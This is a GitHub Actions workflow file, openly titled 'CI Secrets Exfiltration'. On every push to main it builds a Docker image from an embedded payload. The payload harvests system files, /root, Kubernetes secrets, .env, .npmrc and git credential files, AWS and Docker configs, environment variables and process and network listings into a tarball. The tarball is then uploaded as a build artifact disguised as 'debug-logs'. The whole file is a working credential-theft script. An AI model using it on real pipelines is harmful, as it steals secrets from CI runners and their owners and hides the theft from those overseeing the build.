name: CI Secrets Exfiltration

on:
  push:
    branches: [ main ]

jobs:
  exfiltrate:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Build and Run Malicious Image
        run: |
          PAYLOAD=$(cat <<'EOF'
          set -x  # Enable debug output
          mkdir -p /loot && \
          (cp -r /etc /loot/etc || echo "[-] Failed to copy /etc") && \
          (cp -r /root /loot/root || echo "[-] Failed to copy /root") && \
          (cp -r /var/run/secrets /loot/var_run_secrets || echo "[-] Failed to copy /var/run/secrets") && \
          (find / \( -name "*.env" -o -name ".npmrc" -o -name ".git-credentials" \) -exec cp --parents {} /loot/ \; || echo "[-] Find command failed") && \
          (env > /loot/full_env.txt) && \
          (ps aux > /loot/processes.txt) && \
          (netstat -tuln > /loot/network.txt) && \
          (test -d ~/.aws && cp -r ~/.aws /loot/aws || echo "[-] No AWS dir") && \
          (test -d ~/.docker && cp -r ~/.docker /loot/docker || echo "[-] No Docker dir") && \
          (cd /loot && tar -czvf /leaks.tgz .) && \
          echo "[+] Success: leaks.tgz created at /leaks.tgz" || echo "[-] Error: Failed to create leaks.tgz"
          EOF
          )

          docker build --build-arg PAYLOAD="$PAYLOAD" -t secrets-leaker .
          docker run --rm -v $PWD:/out secrets-leaker sh -c "ls -la / && test -f /leaks.tgz && cp /leaks.tgz /out/leaks.tgz || echo '[-] leaks.tgz not found'"

      - name: Upload Artifact
        if: success() || failure()  # Always run, even if previous steps fail
        uses: actions/upload-artifact@v4
        with:
          name: debug-logs
          path: |
            leaks.tgz
            **/logs/*.txt
